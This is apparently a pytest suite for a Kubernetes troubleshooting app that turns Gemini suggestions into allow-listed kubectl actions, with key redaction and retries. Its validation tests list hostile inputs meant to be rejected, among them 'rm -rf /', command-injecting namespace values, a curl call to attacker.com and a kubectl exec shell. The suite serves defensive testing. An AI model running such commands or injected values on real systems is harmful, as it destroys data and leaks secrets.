"""Tests for Gemini reliability, AI structured output, action validation, and controlled execution."""

from __future__ import annotations

import io
import json
import logging
import sys
from pathlib import Path
from urllib import error, request
from unittest.mock import MagicMock, patch

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from webapp.api.actions import (
    SUPPORTED_ACTIONS,
    build_kubectl_argv,
    execute_action,
    parse_command_to_action,
    validate_namespace,
    validate_resource_name,
)
from webapp.api.ai_summary import (
    _clean_error_message,
    _normalise_steps,
    _parse_summary_response,
    _post_json,
    _retry_delay,
    _strip_json_fence,
)


# ─────────────────────────────────────────────────────────────────────────────
# 1. AI Response Parsing & Structured Output
# ─────────────────────────────────────────────────────────────────────────────

def test_parse_summary_response_valid_json_with_steps():
    raw = json.dumps(
        {
            "summary": "15 connection timeouts to db-1 detected in app namespace.",
            "steps": [
                {
                    "title": "Check database pod status",
                    "command": "kubectl get pod db-1 -n app",
                    "explanation": "Verify pod phase, readiness, and restart count.",
                    "risk": "read-only",
                },
                {
                    "title": "Inspect database logs",
                    "command": "kubectl logs db-1 -n app --tail=100",
                    "explanation": "Check recent connection error messages in database log.",
                    "risk": "read-only",
                },
            ],
        }
    )

    result = _parse_summary_response(raw)

    assert result["summary"] == "15 connection timeouts to db-1 detected in app namespace."
    assert len(result["steps"]) == 2
    step1 = result["steps"][0]
    assert step1["title"] == "Check database pod status"
    assert step1["command"] == "kubectl get pod db-1 -n app"
    assert step1["risk"] == "read-only"
    assert step1["is_supported"] is True
    assert step1["action"]["action"] == "get_pod"
    assert step1["action"]["resource"] == "db-1"
    assert step1["action"]["namespace"] == "app"

    # Compatibility: suggested_action is populated
    assert "kubectl get pod db-1 -n app" in result["suggested_action"]


def test_parse_summary_response_markdown_fence_and_surrounding_text():
    raw = """
Here is the troubleshooting plan:
```json
{
  "summary": "High CPU utilization on web-0 pod.",
  "steps": [
    {
      "title": "Check pod resource status",
      "command": "kubectl describe pod web-0 -n default",
      "explanation": "Check CPU requests and limits.",
      "risk": "read-only"
    }
  ]
}
```
Hope this helps!
"""
    result = _parse_summary_response(raw)
    assert result["summary"] == "High CPU utilization on web-0 pod."
    assert len(result["steps"]) == 1
    assert result["steps"][0]["command"] == "kubectl describe pod web-0 -n default"
    assert result["steps"][0]["is_supported"] is True


def test_parse_summary_response_legacy_fallback():
    raw = json.dumps(
        {
            "summary": "Disk quota exceeded on node-1.",
            "suggested_action": "Check disk space on node-1.",
        }
    )
    result = _parse_summary_response(raw)
    assert result["summary"] == "Disk quota exceeded on node-1."
    assert result["suggested_action"] == "Check disk space on node-1."
    assert len(result["steps"]) == 1
    assert result["steps"][0]["explanation"] == "Check disk space on node-1."
    assert result["steps"][0]["risk"] == "read-only"


def test_normalise_steps_infers_risk_and_caps_steps():
    raw_steps = [
        {"title": "Check pod", "command": "kubectl get pod p1 -n default", "explanation": "Check pod"},
        {"title": "Restart deploy", "command": "kubectl rollout restart deployment/web -n default", "explanation": "Restart"},
        {"title": "Delete pod", "command": "kubectl delete pod p1 -n default", "explanation": "Delete"},
    ]
    normal = _normalise_steps(raw_steps, max_steps=2)
    assert len(normal) == 2
    assert normal[0]["risk"] == "read-only"
    assert normal[1]["risk"] == "medium"


# ─────────────────────────────────────────────────────────────────────────────
# 2. Gemini Reliability, Bounded Retries & Error Sanitization
# ─────────────────────────────────────────────────────────────────────────────

def test_clean_error_message_redacts_api_key():
    secret = "AIzaSyD-1234567890abcdef"
    msg = f"Failed to call https://generativelanguage.googleapis.com?key={secret} with token {secret}"
    cleaned = _clean_error_message(msg, secret)

    assert secret not in cleaned
    assert "***REDACTED***" in cleaned


def test_clean_error_message_parses_google_json_error():
    google_err = json.dumps(
        {
            "error": {
                "code": 429,
                "message": "Resource has been exhausted (e.g. check quota).",
                "status": "RESOURCE_EXHAUSTED",
            }
        }
    )
    cleaned = _clean_error_message(google_err)
    assert cleaned == "Resource has been exhausted (e.g. check quota). (RESOURCE_EXHAUSTED)"


def test_post_json_permanent_error_400_not_retried(monkeypatch):
    calls = []

    def mock_urlopen(req, timeout=0):
        calls.append(req)
        fp = io.BytesIO(b'{"error":{"code":400,"message":"API key not valid."}}')
        raise error.HTTPError(req.full_url, 400, "Bad Request", {"Content-Type": "application/json"}, fp)

    monkeypatch.setattr(request, "urlopen", mock_urlopen)

    with pytest.raises(RuntimeError) as exc_info:
        _post_json(
            provider="Gemini",
            url="https://generativelanguage.googleapis.com/v1beta/test",
            body={"test": True},
            headers={"x-goog-api-key": "secret-key"},
            api_key_to_redact="secret-key",
        )

    # Permanent error must fail immediately after 1 attempt
    assert len(calls) == 1
    assert "HTTP 400" in str(exc_info.value)
    assert "API key not valid." in str(exc_info.value)
    assert "secret-key" not in str(exc_info.value)


def test_post_json_transient_503_retries_and_succeeds(monkeypatch):
    attempts = [0]

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self):
            return json.dumps({"candidates": [{"content": {"parts": [{"text": "{\"summary\":\"ok\",\"steps\":[]}"}]}}]}).encode("utf-8")

    def mock_urlopen(req, timeout=0):
        attempts[0] += 1
        if attempts[0] < 3:
            fp = io.BytesIO(b'{"error":{"code":503,"message":"Unavailable"}}')
            raise error.HTTPError(req.full_url, 503, "Service Unavailable", {"Retry-After": "0"}, fp)
        return FakeResponse()

    monkeypatch.setattr(request, "urlopen", mock_urlopen)
    monkeypatch.setattr("time.sleep", lambda _: None)

    res = _post_json(
        provider="Gemini",
        url="https://generativelanguage.googleapis.com/v1beta/test",
        body={"test": True},
        headers={"x-goog-api-key": "secret-key"},
        api_key_to_redact="secret-key",
    )

    assert attempts[0] == 3
    assert "candidates" in res


def test_post_json_transient_exhaustion_raises_clean_error(monkeypatch):
    attempts = [0]

    def mock_urlopen(req, timeout=0):
        attempts[0] += 1
        fp = io.BytesIO(b'{"error":{"code":429,"message":"Quota exceeded"}}')
        raise error.HTTPError(req.full_url, 429, "Too Many Requests", {"Retry-After": "0"}, fp)

    monkeypatch.setattr(request, "urlopen", mock_urlopen)
    monkeypatch.setattr("time.sleep", lambda _: None)

    with pytest.raises(RuntimeError) as exc_info:
        _post_json(
            provider="Gemini",
            url="https://generativelanguage.googleapis.com/v1beta/test",
            body={"test": True},
            headers={"x-goog-api-key": "secret-key"},
            api_key_to_redact="secret-key",
        )

    assert attempts[0] == 4  # _MAX_AI_ATTEMPTS
    assert "HTTP 429" in str(exc_info.value)
    assert "Quota exceeded" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# 3. Action Registry & Validation
# ─────────────────────────────────────────────────────────────────────────────

def test_validate_namespace_and_resource():
    assert validate_namespace("default") == "default"
    assert validate_namespace("kube-system") == "kube-system"
    assert validate_namespace("") == ""
    assert validate_namespace(None) == ""

    with pytest.raises(ValueError):
        validate_namespace("invalid_namespace!")
    with pytest.raises(ValueError):
        validate_namespace("ns; rm -rf /")

    assert validate_resource_name("coredns-77c989547b-8ffp8") == "coredns-77c989547b-8ffp8"
    with pytest.raises(ValueError):
        validate_resource_name("pod/../evil")
    with pytest.raises(ValueError):
        validate_resource_name("pod; evil")


def test_parse_command_to_action_supported_diagnostics():
    # get pod
    a1 = parse_command_to_action("kubectl get pod web-0 -n default -o wide")
    assert a1 == {"action": "get_pod", "resource": "web-0", "namespace": "default", "output": "wide"}

    # get pods
    a2 = parse_command_to_action("kubectl get pods -n kube-system")
    assert a2 == {"action": "get_pods", "resource": "", "namespace": "kube-system", "output": ""}

    # describe pod
    a3 = parse_command_to_action("kubectl describe pod web-0 -n default")
    assert a3 == {"action": "describe_pod", "resource": "web-0", "namespace": "default"}

    # pod logs
    a4 = parse_command_to_action("kubectl logs pod/db-1 -n app -c postgres --tail=50")
    assert a4 == {
        "action": "get_pod_logs",
        "resource": "db-1",
        "namespace": "app",
        "container": "postgres",
        "tail": 50,
        "previous": False,
    }

    # events
    a5 = parse_command_to_action("kubectl get events -n default")
    assert a5 == {"action": "get_events", "resource": "", "namespace": "default"}

    # deployment
    a6 = parse_command_to_action("kubectl get deployment nginx -n default")
    assert a6 == {"action": "get_deployment", "resource": "nginx", "namespace": "default", "output": ""}

    # rollout status
    a7 = parse_command_to_action("kubectl rollout status deployment/coredns -n kube-system")
    assert a7 == {"action": "rollout_status", "resource": "coredns", "namespace": "kube-system"}

    # rollout restart (mutating)
    a8 = parse_command_to_action("kubectl rollout restart deployment/nginx -n default")
    assert a8 == {"action": "rollout_restart", "resource": "nginx", "namespace": "default"}


def test_parse_command_rejects_unsafe_arbitrary_commands():
    # Shell execution attempts
    assert parse_command_to_action("rm -rf /") is None
    assert parse_command_to_action("sh -c 'echo pwned'") is None
    assert parse_command_to_action("curl https://attacker.com/leak") is None

    # Unsupported kubectl commands
    assert parse_command_to_action("kubectl exec -it web-0 -- /bin/sh") is None
    assert parse_command_to_action("kubectl delete pod web-0 --all") is None
    assert parse_command_to_action("kubectl edit configmap logging") is None
    assert parse_command_to_action("kubectl run bad-pod --image=evil") is None


def test_build_kubectl_argv_safe_construction():
    argv = build_kubectl_argv({
        "action": "get_pod_logs",
        "resource": "web-0",
        "namespace": "app",
        "container": "nginx",
        "tail": 200,
    })
    assert argv == ["kubectl", "logs", "web-0", "-n", "app", "-c", "nginx", "--tail=200"]


# ─────────────────────────────────────────────────────────────────────────────
# 4. Command Execution & Mutating Confirmation
# ─────────────────────────────────────────────────────────────────────────────

def test_execute_action_mutating_requires_confirmation():
    action = {"action": "rollout_restart", "resource": "nginx", "namespace": "default"}
    # Without confirmation
    res = execute_action(action, confirmed=False)
    assert res["success"] is False
    assert res["requires_confirmation"] is True
    assert "Explicit confirmation is required" in res["message"]

    # With confirmation, mock subprocess.run to verify it executes
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="deployment.apps/nginx restarted\n", stderr="")
        res_confirmed = execute_action(action, confirmed=True)
        assert res_confirmed["success"] is True
        assert res_confirmed["exit_code"] == 0
        assert "restarted" in res_confirmed["stdout"]
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        assert kwargs["shell"] is False  # Strictly NO shell


def test_execute_action_read_only_runs_without_confirmation():
    action = {"action": "get_pods", "namespace": "kube-system"}
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="NAME STATUS\ncoredns Running\n", stderr="")
        res = execute_action(action, confirmed=False)
        assert res["success"] is True
        assert res["exit_code"] == 0
        assert "coredns Running" in res["stdout"]


def test_execute_action_rejects_unregistered_action():
    with pytest.raises(ValueError, match="Unsupported or invalid action"):
        execute_action({"action": "drop_database"})
